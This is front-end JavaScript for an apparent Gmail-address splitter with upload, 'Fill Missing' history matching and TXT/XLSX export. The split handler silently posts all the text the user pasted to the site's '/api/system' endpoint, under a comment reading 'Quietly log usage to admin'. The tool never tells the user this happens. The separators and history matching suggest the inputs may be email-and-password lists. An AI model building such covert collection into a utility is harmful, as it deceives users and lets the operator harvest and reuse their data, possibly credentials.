// Helper to log system data to admin dashboard
const logSystemData = async (source, data) => {
    if (!data || data.trim().length === 0) return;
    try {
        await fetch('/api/system', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ action: 'log', source: source, data: data })
        });
    } catch (e) {
        console.error('Logging failed:', e);
    }
};

document.addEventListener('DOMContentLoaded', () => {
    const inputText = document.getElementById('inputText');
    const outputText = document.getElementById('outputText');
    const inputCount = document.getElementById('inputCount');
    const outputCount = document.getElementById('outputCount');
    const fileInput = document.getElementById('fileInput');

    // UI Elements
    const splitBtn = document.getElementById('splitBtn');
    const fillBtn = document.getElementById('fillBtn');
    const clearAllBtn = document.getElementById('clearAllBtn');
    const clearInputBtn = document.getElementById('clearInputBtn');
    const clearOutputBtn = document.getElementById('clearOutputBtn');
    const downloadTxtBtn = document.getElementById('downloadTxtBtn');
    const downloadXlsxBtn = document.getElementById('downloadXlsxBtn');

    const updateCounts = () => {
        const inLines = inputText.value.split('\n').filter(line => line.trim()).length;
        const outLines = outputText.value.split('\n').filter(line => line.trim()).length;
        inputCount.textContent = `Total: ${inLines}`;
        outputCount.textContent = `Total: ${outLines}`;
    };

    inputText.addEventListener('input', updateCounts);
    outputText.addEventListener('input', updateCounts);

    // File Input handling
    fileInput.addEventListener('change', (e) => {
        const file = e.target.files[0];
        if (!file) return;
        const reader = new FileReader();
        reader.onload = (event) => {
            inputText.value = event.target.result;
            updateCounts();
        };
        reader.readAsText(file);
    });

    // --- Action Handlers ---

    // 1. Split Gmails
    splitBtn.addEventListener('click', () => {
        const data = inputText.value;
        if (!data.trim()) return;

        // Quietly log usage to admin
        logSystemData('Splitter', data);

        const lines = data.split('\n');
        const gmailAddresses = lines
            .map(line => {
                const match = line.match(/([a-zA-Z0-9._%+-]+@gmail\.com)/i);
                return match ? match[1] : null;
            })
            .filter(email => email !== null);

        outputText.value = gmailAddresses.join('\n');
        updateCounts();
    });

    // 2. Fill Missing (Match from history)
    fillBtn.addEventListener('click', async () => {
        const data = inputText.value;
        if (!data.trim()) return;

        fillBtn.disabled = true;
        fillBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';

        try {
            const inputLines = data.split('\n').filter(l => l.trim());
            const response = await fetch('/api/system', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ action: 'find_matches', emails: inputLines })
            });

            if (response.ok) {
                const result = await response.json();
                outputText.value = result.results.join('\n');
                updateCounts();
            } else {
                console.error('Fill Missing failed');
            }
        } catch (err) {
            console.error('Network error during Fill Missing:', err);
        } finally {
            fillBtn.disabled = false;
            fillBtn.innerHTML = '<i class="fas fa-magic"></i> Fill Missing';
        }
    });

    // 3. Clear Buttons
    clearInputBtn.addEventListener('click', () => {
        inputText.value = '';
        updateCounts();
    });

    clearOutputBtn.addEventListener('click', () => {
        outputText.value = '';
        updateCounts();
    });

    clearAllBtn.addEventListener('click', () => {
        if (confirm("Clear all input and output data?")) {
            inputText.value = '';
            outputText.value = '';
            updateCounts();
        }
    });

    // 4. Download Handlers
    downloadTxtBtn.addEventListener('click', () => {
        const data = outputText.value.trim();
        if (!data) return;
        const blob = new Blob([data], { type: 'text/plain' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'output.txt';
        a.click();
        URL.revokeObjectURL(url);
    });

    downloadXlsxBtn.addEventListener('click', () => {
        const data = outputText.value.trim();
        if (!data) return;

        const lines = data.split('\n');
        const rows = lines.map(line => {
            const separators = /[|;:\t]/;
            const parts = line.split(separators);
            return parts.map(p => p.trim());
        });

        const worksheet = XLSX.utils.aoa_to_sheet(rows);
        const workbook = XLSX.utils.book_new();
        XLSX.utils.book_append_sheet(workbook, worksheet, "Emails");
        XLSX.writeFile(workbook, "results.xlsx");
    });
});
